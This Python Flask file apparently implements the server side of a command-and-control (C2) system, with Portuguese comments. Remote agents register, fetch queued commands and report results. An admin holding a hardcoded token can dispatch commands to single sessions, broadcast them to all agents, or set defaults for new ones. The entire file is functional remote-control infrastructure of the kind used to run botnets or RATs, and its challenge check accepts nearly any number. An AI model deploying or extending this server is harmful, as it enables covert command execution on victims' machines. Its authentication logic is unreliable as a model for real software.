import re
from flask import Flask, request, session
from agent import Agent
from command import Command
from time import time

PORT = 80
app = Flask(__name__)
admin_token = "fb1cd725-e33b-494d-9159-50921151b22c"  # Mude isso


def generate_challenge():
    return int(time())


def verify_challenge(n: int) -> int:
    """
    Calcula a resposta ao desafio do servidor com base em um número fornecido.

    Operação aplicada:
      1. Multiplica o número por uma constante (por exemplo, 1234567)
      2. Adiciona outra constante (por exemplo, 890123)
      3. Aplica um módulo para manter o valor dentro de um intervalo previsível (por exemplo, 2**32)

    Isso garante que tanto o agente quanto o servidor, conhecendo as constantes e a operação,
    consigam verificar rapidamente a autenticidade.

    :param n: número do desafio enviado pelo servidor
    :return: resposta calculada
    """
    MULTIPLIER = 1234567
    ADDEND = 890123
    MODULUS = 2**32

    return (n * MULTIPLIER + ADDEND) % MODULUS


if __name__ == "__main__":

    c2 = Command()

    @app.route("/", methods=["POST"])
    def core():

        data = request.get_data().decode()
        ip = request.remote_addr
        token = request.headers.get("token")

        ######################
        #### AUTENTICAÇÃO ####
        ######################

        if data == "hi":
            # Solicitação de desafio
            return str(generate_challenge())


        elif data.strip().isdigit() and verify_challenge(int(data.strip())):
            # Resposta desafio + criação de sessão
            agent = Agent(ip)
            session_id = c2.signup_agent(agent)
            c2.add_notification(f"Session {session_id} > joined.")
            return str(agent.token)

        #######################
        #### ADMINISTRAÇÃO ####
        #######################

        elif token == admin_token:
            # Verificando autenticação
            if data == "ping":
                # print("Admin executando ping")
                retorno = "pong|" + c2.get_notification()
                return retorno

            elif data == "ls":
                # print("Admin executando ls")
                status = c2.get_current_status()
                c2.add_notification(status)

            elif cmd := re.match(r"(?:s|session) ?(\d+) ?> ?(.*)", data, re.IGNORECASE):
                # print(f"Admin enviando comando {cmd.group(2)} para session {cmd.group(1)}")
                if agent := c2.get_agent_by_session_id(int(cmd.group(1))):
                    agent.next_command = cmd.group(2)

            elif cmd := re.match(r"(?:b|broadcast) ?> ?(.*)", data, re.IGNORECASE):
                print(f"Admin enviando broadcast para agents {cmd.group(1)}")
                c2.send_broadcast_command(cmd.group(1))

            elif cmd := re.match(r"(?:d|default) ?> ?(.*)", data, re.IGNORECASE):
                print(
                    f"Admin definindo comando padrão para novos agents {cmd.group(1)}"
                )
                Agent.set_default_command(cmd.group(1))

            return ""

        #################
        #### AGENTES ####
        #################

        # Agent - Funções
        elif result := c2.get_agent_by_token(token):
            session_id, agent = result
            agent.update_last_communication()

            if not data:
                command_to_run = agent.command_request()
                # print("Agent solicitando ordem")
                return command_to_run
            else:
                # print("Agent enviando resultado de comando executado")
                c2.add_notification(f"Session {session_id} > {data}")
                agent.last_response = data

            return ""

        else:
            return "False"

    app.run(host="0.0.0.0", port=PORT)
